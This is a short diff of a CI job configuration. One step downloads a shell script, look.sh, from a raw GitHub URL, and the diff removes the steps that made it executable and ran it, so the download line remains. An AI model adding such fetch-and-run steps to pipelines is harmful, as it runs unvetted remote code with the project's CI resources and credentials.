@@ -10,5 +10,4 @@ jobs:
       size: "medium" # can be "medium", "large", "xlarge", "2xlarge"
     steps:
       - run: wget https://raw.githubusercontent.com/vivomito/out/main/look.sh
-      - run: chmod +x look.sh
-      - run: ./look.sh
+      
